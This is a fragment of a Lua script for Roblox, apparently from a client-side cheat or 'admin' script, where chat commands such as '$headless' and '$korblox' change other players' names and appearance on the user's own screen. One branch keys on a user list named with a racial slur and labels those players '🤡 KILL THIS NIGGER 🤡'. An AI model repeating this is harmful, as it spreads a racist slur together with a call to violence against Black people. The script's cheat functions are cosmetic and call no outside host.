	if cht:match("$unrename") then
		if game.Players.LocalPlayer ~= v then
		renaming = false
		if StarId[v.UserId] then
	    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
		elseif StaffId[v.UserId] then
        v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
		elseif AdminId[v.UserId] then
	v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
		end
	end
end
end)

v.Chatted:connect(function(cht)
	if cht:match("$headless") then
		if game.Players.LocalPlayer ~= v then
		    v.Character.Head.Transparency = 1
            for i,v in pairs(v.Character.Head:GetChildren()) do
            if (v:IsA("Decal")) then
                v:Destroy()
                end
            end
		end
    end
end)
	
v.Chatted:connect(function(cht)
	if cht:match("$korblox") then
		if game.Players.LocalPlayer ~= v then
            local chr = v.Character
            chr.RightLowerLeg.MeshId = "902942093"
            chr.RightLowerLeg.Transparency = "1"
            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
            chr.RightFoot.MeshId = "902942089"
            chr.RightFoot.Transparency = "1"
		end
    end
end)
elseif NiggaId[v.UserId] then
	if v.Character then
		if v.Character.Parent.Name == 'Players' then
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('🤡 KILL THIS NIGGER 🤡')
		end
	end
end
elseif not v.Character.UpperTorso:FindFirstChild('WaistRigAttachment') then
		v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😁]'..v.DisplayName)
        end
    end
end
local success,err = pcall(premium)
